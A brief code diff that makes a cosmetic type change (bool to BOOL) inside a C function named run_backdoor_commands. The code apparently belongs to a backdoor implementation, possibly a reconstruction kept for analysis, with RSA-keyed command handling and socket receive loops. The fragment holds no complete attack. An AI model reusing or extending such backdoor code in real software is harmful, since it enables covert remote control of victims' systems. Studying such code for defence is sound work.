@@ -463,7 +463,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 											if(!ctx->libc_imports->pselect) break;
 											if(!ctx->libc_imports->__errno_location) break;
 
-											bool do_break = false;
+											BOOL do_break = FALSE;
 											int res;
 											for(;;){
 												*(u64 *)&f.u.sock.fd_recv_buf[16] = __builtin_bswap32(0x50);
@@ -480,7 +480,7 @@ BOOL run_backdoor_commands(RSA *rsa, global_context_t *ctx, BOOL *do_orig){
 													NULL
 												)) >= 0) break;
 												if(*ctx->libc_imports->__errno_location() != EINTR){
-													do_break = true;
+													do_break = TRUE;
 													break;
 												}
 											}
